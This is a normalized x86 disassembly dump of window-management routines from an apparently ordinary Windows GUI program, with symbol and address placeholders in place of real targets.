retn 0x10
cmp [ esi - 0x54 ] 0x0
je r-xdata
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ esi - 0x54 ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push ebx
push edx
mov edx [ ebp + 0xc ]
push edx
push edi
call eax
mov edx [ esi ]
mov edx [ edx + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push ebx
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
mov ecx esi
call edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42be90
push ebp
mov ebp esp
xor eax eax
cmp [ ecx - 0x58 ] eax
je r-xdata
pop ebp
retn 0x18
cmp [ ecx - 0x54 ] eax
je r-xdata
mov ecx [ ecx - 0x54 ]
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
pop ebp
jmp eax
sub_42bf50
push ebp
mov ebp esp
cmp [ ecx - 0x58 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn 0x10
mov ecx [ ecx - 0x58 ]
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
mov edx [ edx + 0x48 ]
pop ebp
jmp edx
sub_42bf80
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
test eax eax
je r-xdata
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push ecx
push eax
call sub_40e330
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov edi edi
inc ebx
cmp ebx edi
jl r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x2c ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
call eax
mov edx [ esi + 0x74 ]
mov ecx [ edx + ebx * 4 ]
test ecx ecx
je r-xdata
sub_42bfe0
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi ecx
mov edx [ esi - 0x28 ]
mov eax [ esi - 0x30 ]
mov ecx [ esi - 0x2c ]
mov [ ebp - 0x10 ] edx
mov edx [ esi - 0x24 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x8 ]
add eax edx
sub ebx edx
mov edx [ ebp + 0xc ]
add ebx eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
push edi
mov edi [ esi + 0x8 ]
sub edi [ esi + 0x4 ]
add ecx edx
sub eax edx
add eax ecx
mov [ ebp - 0xc ] eax
sar edi 0x2
xor eax eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] eax
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + eax * 4 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax edi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x74 ]
call eax
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x58 ]
call eax
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov eax [ eax ]
push ecx
mov ecx [ ebp - 0x18 ]
sub esp 0x10
mov edx esp
mov [ edx ] ecx
mov ecx [ ebp - 0x14 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ edx + 0x8 ] ebx
mov [ edx + 0xc ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ eax + 0x80 ]
call edx
sub_42c0c0
push ebp
mov ebp esp
push 0xffffffff
push sub_449af8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_418ad0
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x4
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x228 ] 0x56010000
mov [ esi + 0x244 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_42c160
push ebp
mov ebp esp
push 0xffffffff
push sub_449ac8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_418cc0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42c1f0
push ebp
mov ebp esp
push 0xffffffff
push sub_449a98
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ecx + 0x70 ] r--data
mov [ ecx + 0x154 ] r--data
mov [ ecx + 0x1a4 ] r--data
mov [ ecx + 0x1ac ] r--data
mov [ ecx + 0x1d4 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_418cc0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_42c270
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x69 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp + 0xc ]
push eax
push edi
call sub_40e4c0
cmp [ esi + 0x158 ] 0x0
mov eax [ esi + 0x4 ]
mov [ esi + 0x244 ] edi
mov ecx [ eax + 0x70 ]
mov [ esi + 0x194 ] ecx
mov edx [ eax + 0x80 ]
mov [ esi + 0x198 ] edx
je r-xdata
mov [ edi + 0x40 ] 0x1
pop edi
pop esi
pop ebp
retn 0x8
movzx eax [ edi + 0xf6 ]
mov [ esi + 0x158 ] eax
sub_42c2f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push edi
push ecx
mov ecx esi
call edx
test al al
jne r-xdata
mov eax ebx
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax + 0x60 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8c ]
mov [ esi + 0x230 ] ecx
mov ecx esi
call edx
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x18 ]
test eax eax
jne r-xdata
xor ecx ecx
mov edi edi
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
mov [ esp + 0x10 ] edx
mov edx [ esi + 0x4c ]
mov [ esp + 0xc ] eax
mov eax [ esi + 0x48 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
lea edx [ esp + 0xc ]
push edx
push esi
call eax
cmp eax 0x80004001
je r-xdata
and [ esi + 0x228 ] 0xefffffff
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov [ esi + 0x40 ] eax
mov [ esi + 0x50 ] eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x54 ] ecx
mov [ esi + 0x48 ] edx
mov [ esi + 0x58 ] edx
mov [ esi + 0x4c ] edi
mov [ esi + 0x5c ] edi
mov edx [ esi + 0x224 ]
mov ecx [ esi + 0x220 ]
push edx
push ecx
mov eax esp
mov [ eax ] 0x0
mov eax [ esi + 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x228 ]
push 0x0
push edx
push ecx
mov edx esp
lea edi [ esp + 0x30 ]
mov [ edx ] edi
mov edx [ esi + 0x230 ]
push edx
add esi 0x1ac
call sub_417470
xor ecx ecx
pop edi
test eax eax
setne al
mov ecx [ esp + 0x28 ]
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
lea edx [ esp + 0x1c ]
push edx
call [ IsRectEmpty@IAT ]
test eax eax
je r-xdata
test [ esi + 0x228 ] 0x10000000
mov ecx [ esi + 0x40 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x48 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esi + 0x4c ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] ecx
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x74 ]
mov ecx ebx
call eax
test al al
jne r-xdata
mov ecx [ esi + 0x230 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
call [ GetClientRect@IAT ]
sub_42c490
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ esi + 0x1b0 ]
lea eax [ ebp - 0x14 ]
xor ebx ebx
push eax
push ecx
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call [ GetClientRect@IAT ]
mov eax edi
cmp edi ebx
jne r-xdata
mov ecx [ eax + 0x60 ]
cmp ecx ebx
jne r-xdata
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
cmp [ esi + 0x230 ] ecx
je r-xdata
mov eax [ eax + 0x18 ]
cmp eax ebx
jne r-xdata
xor ecx ecx
mov eax [ esi + 0x4c ]
sub eax [ esi + 0x44 ]
mov ecx [ esi + 0x48 ]
sub ecx [ esi + 0x40 ]
mov edx [ esi + 0x44 ]
push 0x214
push eax
mov eax [ esi + 0x40 ]
push ecx
mov ecx [ esi + 0x1b0 ]
push edx
push eax
push ebx
push ecx
call [ SetWindowPos@IAT ]
mov edx [ esi ]
mov eax [ edx + 0xa4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8c ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x64 ]
mov ecx esi
call eax
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
sar edi 0x2
test edi edi
jle r-xdata
mov edx [ esi + 0x1b0 ]
push ecx
push edx
mov [ esi + 0x230 ] ecx
call [ SetParent@IAT ]
cmp [ esi + 0x1a0 ] 0x0
lea edx [ esi + 0x154 ]
je r-xdata
lea ebx [ ebx ]
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov ecx 0x1
call sub_41ae80
inc ebx
cmp ebx edi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
sub eax [ esi + 0x44 ]
mov edx [ esi + 0x154 ]
mov edx [ edx + 0x8 ]
push 0x6
push eax
mov eax [ esi + 0x48 ]
sub eax [ esi + 0x40 ]
lea ecx [ esi + 0x154 ]
push eax
call edx
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
lea esp [ esp ]
mov ecx [ esi + 0x74 ]
mov ecx [ ecx + ebx * 4 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x10
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x10 ] 0x1
je r-xdata
mov eax [ esi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x0
call eax
mov eax [ ecx ]
mov edx [ eax + 0x74 ]
call edx
test al al
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov ecx [ esi + 0x74 ]
mov ecx [ ecx + ebx * 4 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x10
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov al 0x1
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1b0 ]
push ecx
call [ IsWindowVisible@IAT ]
test eax eax
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x68 ]
call eax
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x0
call eax
mov eax [ esi + 0x1b0 ]
push eax
call [ IsWindowVisible@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0x1b0 ]
push 0x5
push edx
jmp r-xdata
mov ecx [ esi + 0x1b0 ]
push 0x5
push ecx
call [ ShowWindow@IAT ]
sub_42c6c0
push ebx
push esi
push edi
mov esi ecx
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov eax [ esi + 0x1b0 ]
mov edi [ DestroyWindow@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x1a8 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x1b0 ] 0x0
inc ebx
cmp ebx edi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
call eax
pop edi
pop esi
pop ebx
retn
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x1a8 ]
push ecx
call edi
mov [ esi + 0x1a8 ] 0x0
sub_42c740
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push ebx
mov ebx ecx
push esi
mov [ ebx + 0x26 ] al
test al al
je r-xdata
mov ecx [ ebx + 0x1b0 ]
movzx eax al
neg eax
sbb eax eax
and eax 0x5
push eax
push ecx
call [ ShowWindow@IAT ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x1a0 ] 0x0
lea edx [ ebx + 0x154 ]
je r-xdata
mov eax [ ebx + 0x1b0 ]
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov ecx [ ebx + 0x1b0 ]
push ecx
call [ UpdateWindow@IAT ]
mov edx [ ebx + 0x1b0 ]
push edi
push 0x0
push 0x0
push 0x2a3
push edx
lea edi [ ebx + 0x70 ]
lea esi [ ebp + 0xb ]
mov [ ebp + 0xb ] 0x0
call sub_4130a0
pop edi
jmp r-xdata
mov ecx 0x7
call sub_41ae80
mov al [ ebp + 0x8 ]
mov edx [ ebx + 0x1b0 ]
push edx
call [ GetParent@IAT ]
push 0x0
add ebx 0x40
mov esi eax
push ebx
push esi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
sub_42c800
push ebx
mov ebx ecx
push esi
mov [ ebx + 0x29 ] 0x1
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x34 ]
call eax
sub_42c840
push ebp
mov ebp esp
cmp [ ecx - 0x58 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn 0x10
mov ecx [ ecx - 0x58 ]
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
mov edx [ edx + 0x8 ]
pop ebp
jmp edx
sub_42c870
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x111
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push edx
mov edx [ eax + 0x18 ]
push ecx
push edi
mov ecx esi
call edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ esi - 0x54 ] 0x0
je r-xdata
xor eax eax
mov eax [ eax + 0x14 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ esi - 0x54 ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push ebx
push edx
mov edx [ ebp + 0xc ]
push edx
push edi
call eax
mov edx [ esi ]
mov edx [ edx + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push ebx
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
mov ecx esi
call edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42c900
push ebp
mov ebp esp
push ecx
mov al [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x28 ] al
test al al
je r-xdata
push ebx
mov ebx [ esi + 0x78 ]
sub ebx [ esi + 0x74 ]
xor eax eax
sar ebx 0x2
mov [ ebp - 0x4 ] eax
test ebx ebx
jle r-xdata
mov eax [ esi + 0x4 ]
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x29 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0x70 ]
call sub_413180
cmp [ ebp + 0x8 ] 0x0
pop ebx
jne r-xdata
push edi
jmp r-xdata
call sub_4142d0
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x234 ] 0x0
jne r-xdata
mov ecx [ esi + 0x74 ]
mov edi [ ecx + eax * 4 ]
test edi edi
je r-xdata
mov edx [ esi + 0x1b0 ]
push 0x0
push edx
call [ ShowWindow@IAT ]
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax ebx
jl r-xdata
cmp [ edi + 0x14 ] 0x1
je r-xdata
pop edi
mov edx [ edi ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
push eax
mov ecx edi
call edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x1b0 ]
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4c ]
push 0x0
mov ecx edi
call eax
push eax
lea eax [ esi + 0x1a4 ]
push eax
mov eax edi
call sub_419e00
sub_42c9e0
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ecx - 0x24 ]
mov eax [ ecx - 0x28 ]
push ebx
mov ebx [ ecx - 0x2c ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ecx - 0x30 ]
mov ecx [ ecx - 0x54 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp + 0x8 ]
add edi edx
mov [ ebp - 0xc ] eax
mov eax edi
sub eax edx
mov edx [ ebp + 0x14 ]
add eax [ ebp + 0x10 ]
add ebx esi
sub edx esi
mov esi [ ebp + 0x18 ]
push esi
sub esp 0x10
mov esi esp
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
mov [ esi ] edi
mov [ ebp + 0x18 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x18 ]
mov eax [ eax + 0x30 ]
add edx ebx
mov [ esi + 0xc ] edx
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_42ca50
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + 0xf4 ]
push 0xcc0020
push eax
push edx
push ecx
mov ecx [ ebp + 0x14 ]
sub ecx eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x18 ]
sub eax edx
mov edx [ ecx + 0x8 ]
push eax
mov eax [ edx ]
push 0x0
push 0x0
push eax
call [ BitBlt@IAT ]
pop ebp
retn 0x14
sub_42ca90
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi - 0x150 ]
cmp [ eax + 0xa9 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
cmp [ esi + 0xe8 ] 0x0
je r-xdata
cmp [ esi - 0x138 ] 0x0
je r-xdata
mov edx [ esi - 0x154 ]
mov eax [ edx + 0xc4 ]
lea ebx [ esi - 0x154 ]
push edi
mov ecx ebx
call eax
push edi
call sub_419380
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ esi - 0xe4 ]
mov eax [ edx + 0x2c ]
lea ecx [ esi - 0xe4 ]
call eax
test al al
je r-xdata
mov ebx [ esi - 0x114 ]
mov ecx [ esi - 0x138 ]
mov edx [ ecx ]
push edi
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ esi - 0x110 ]
mov [ eax + 0x4 ] ebx
mov ebx [ esi - 0x10c ]
mov [ eax + 0x8 ] ebx
mov ebx [ esi - 0x108 ]
mov [ eax + 0xc ] ebx
mov eax [ edx + 0x34 ]
jmp r-xdata
cmp [ esi - 0x138 ] 0x0
je r-xdata
call eax
mov ebx [ esi - 0x114 ]
mov ecx [ esi - 0x138 ]
mov edx [ ecx ]
push edi
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ esi - 0x110 ]
mov [ eax + 0x4 ] ebx
mov ebx [ esi - 0x10c ]
mov [ eax + 0x8 ] ebx
mov ebx [ esi - 0x108 ]
mov [ eax + 0xc ] ebx
mov eax [ edx + 0x30 ]
sub_42cb70
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_446b75
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x88 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ esp + 0x14 ] eax
xor eax eax
mov [ esp + 0x90 ] eax
mov ecx [ esi + 0x174 ]
mov edx [ esi + 0x178 ]
mov edi [ esi + 0x4 ]
mov [ esp + 0x30 ] ecx
mov ecx [ esi + 0x17c ]
mov [ esp + 0x34 ] edx
mov edx [ esi + 0x180 ]
mov [ esp + 0x38 ] ecx
mov [ esp + 0x18 ] eax
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0x18 ]
lea eax [ esp + 0x1c ]
mov [ esp + 0x3c ] edx
call sub_414260
mov edi [ edi + 0xb4 ]
mov eax [ esp + 0x1c ]
cmp eax edi
je r-xdata
mov [ esp + 0x90 ] 0xffffffff
mov ecx [ esp + 0x88 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x70 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edi [ eax + 0x10 ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov eax [ esi + 0x244 ]
cmp [ eax + 0xf4 ] bl
je r-xdata
cmp [ eax + 0xf5 ] bl
je r-xdata
mov ecx [ edi + 0x14 ]
mov eax [ edi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx edi
call edx
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
mov [ esp + 0x78 ] ecx
push ebx
lea ecx [ esp + 0x74 ]
push ecx
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x38 ]
mov [ esp + 0x84 ] eax
mov eax [ edi ]
push edx
mov edx [ eax + 0x14 ]
mov [ esp + 0x7c ] ebx
mov [ esp + 0x80 ] ebx
push ecx
jmp r-xdata
lea ecx [ esp + 0x50 ]
push ecx
lea ecx [ esp + 0x44 ]
lea edx [ esp + 0x64 ]
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x70 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
call sub_413b10
mov edx [ edi ]
mov esi [ esp + 0x14 ]
mov edx [ edx + 0x14 ]
push ebx
lea eax [ esp + 0x54 ]
push eax
mov ecx eax
push ecx
push esi
mov ecx edi
call edx
mov eax [ esp + 0x30 ]
mov edx [ esp + 0x3c ]
mov ecx [ esp + 0x34 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x38 ]
mov [ esp + 0x28 ] eax
sub eax [ esp + 0x48 ]
mov [ esp + 0x2c ] edx
add eax [ esp + 0x40 ]
push ebx
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x50 ]
sub eax [ esp + 0x48 ]
mov [ esp + 0x28 ] ecx
mov [ esp + 0x30 ] eax
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
push esi
mov ecx edi
call edx
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x3c ]
mov [ esp + 0x20 ] eax
sub eax [ esp + 0x50 ]
mov [ esp + 0x24 ] ecx
add eax [ esp + 0x58 ]
mov ecx [ esp + 0x38 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x40 ]
sub eax [ esp + 0x48 ]
mov [ esp + 0x2c ] edx
add ecx eax
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x6c ]
sub ecx [ esp + 0x64 ]
push ebx
mov [ esp + 0x30 ] ecx
mov edx [ edi ]
mov edx [ edx + 0x18 ]
lea eax [ esp + 0x64 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
push esi
mov eax [ esp + 0x14 ]
push eax
lea esi [ esp + 0x34 ]
mov ecx edi
call sub_40e6c0
jmp r-xdata
mov ecx edi
call edx
sub_42cdd0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
push esi
mov edi ecx
mov ecx [ ebp + 0xc ]
push eax
push ecx
push edx
mov ecx edi
call sub_418fb0
cmp [ ebp + 0xc ] 0x5
mov ebx eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ edi ]
mov edx [ edx + 0xb4 ]
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx edi
call edx
mov eax ebx
sub_42ce30
push ebp
mov ebp esp
cmp [ ecx + 0x29 ] 0x0
je r-xdata
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0xb8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
call eax
sub_42ce50
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0xa4 ]
push edi
mov [ esi + 0x238 ] 0x1
call edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x154 ]
mov edx [ eax + 0x8 ]
push 0x0
push ebx
push ecx
lea ecx [ esi + 0x154 ]
call edx
mov eax [ esi ]
mov edx [ eax + 0x64 ]
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
mov edx [ eax + 0xbc ]
push ebx
push ecx
mov ecx esi
call edx
mov ecx 0x7
lea edx [ esi + 0x154 ]
call sub_41ae80
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0xc0 ]
